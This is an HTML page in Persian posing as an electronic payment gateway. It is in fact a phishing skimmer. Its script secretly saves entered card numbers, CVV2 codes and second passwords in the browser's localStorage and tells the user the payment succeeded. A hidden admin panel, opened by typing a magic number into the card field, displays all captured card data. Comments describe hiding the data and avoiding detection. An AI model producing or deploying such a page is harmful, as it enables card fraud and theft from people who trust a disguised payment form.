<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>پرداخت امن</title>
  <style>
    body { font-family: Tahoma, sans-serif; direction: rtl; background: #f5f5f5; margin: 0; }
    .container { width: 400px; margin: 50px auto; background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    .header { text-align: center; color: #005566; font-size: 18px; margin-bottom: 20px; }
    .input-group { margin: 15px 0; }
    input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
    button { width: 100%; padding: 12px; background: #005566; color: white; border: none; border-radius: 4px; cursor: pointer; }
    button:hover { background: #003d4a; }
    .hidden { display: none; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">درگاه پرداخت الکترونیک</div>
    <form id="payment-form">
      <div class="input-group">
        <input type="text" id="card-number" placeholder="شماره کارت (16 رقم)" maxlength="16" required>
      </div>
      <div class="input-group">
        <input type="password" id="cvv" placeholder="CVV2 (3 یا 4 رقم)" maxlength="4" required>
      </div>
      <div class="input-group">
        <input type="password" id="password" placeholder="رمز دوم" required>
      </div>
      <button type="submit">پرداخت</button>
    </form>
    <div id="admin-panel" class="hidden"></div>
  </div>

  <script>
    // ذخیره اطلاعات به صورت مخفی
    document.getElementById("payment-form").addEventListener("submit", function(e) {
      e.preventDefault();
      let cardNumber = document.getElementById("card-number").value;
      let cvv = document.getElementById("cvv").value;
      let password = document.getElementById("password").value;

      // ذخیره در localStorage
      let data = { card: cardNumber, cvv: cvv, pass: password, time: new Date().toLocaleString() };
      let storedData = JSON.parse(localStorage.getItem("payment-data")) || [];
      storedData.push(data);
      localStorage.setItem("payment-data", JSON.stringify(storedData));

      // شبیه‌سازی پرداخت موفق برای کاربر
      alert("پرداخت با موفقیت انجام شد! (نمایشی)");
      this.reset();
    });

    // چک کردن رمز مدیر
    document.getElementById("card-number").addEventListener("input", function() {
      if (this.value === "12122312") {
        let storedData = JSON.parse(localStorage.getItem("payment-data")) || [];
        let adminPanel = document.getElementById("admin-panel");
        adminPanel.classList.remove("hidden");
        adminPanel.innerHTML = `
          <h3>مدیریت اطلاعات</h3>
          <div style="text-align: right;">
            ${storedData.map((d, i) => `${i + 1}. کارت: ${d.card} | CVV: ${d.cvv} | رمز: ${d.pass} | زمان: ${d.time}`).join("<br>")}
          </div>
          <button onclick="localStorage.clear(); document.getElementById('admin-panel').classList.add('hidden');" style="margin-top: 10px; background: #dc3545;">حذف همه</button>
        `;
        this.value = ""; // پاک کردن رمز مدیر از فیلد
      }
    });

    // جلوگیری از تشخیص آسان
    window.addEventListener("beforeunload", function() {
      // اطلاعات موقع خروج یا رفرش پاک نمیشه و پنهان می‌مونه
    });
  </script>
</body>
</html>
